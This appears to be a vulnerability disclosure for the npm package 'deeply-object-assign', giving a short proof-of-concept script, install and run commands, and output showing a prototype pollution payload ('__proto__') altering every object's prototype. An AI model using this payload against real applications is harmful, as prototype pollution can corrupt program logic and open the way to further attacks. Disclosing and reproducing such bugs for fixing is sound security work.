# Description

`deeply-object-assign` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var deeplyObjectAssign = require("deeply-object-assign")
const payload = JSON.parse('{"__proto__":{"polluted":"Yes! Its Polluted"}}');
var obj = {}
console.log("Before : " + {}.polluted);
deeplyObjectAssign(obj, payload);
console.log("After : " + {}.polluted);
```

2. Execute the following commands in terminal:

```
npm i deeply-object-assign # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
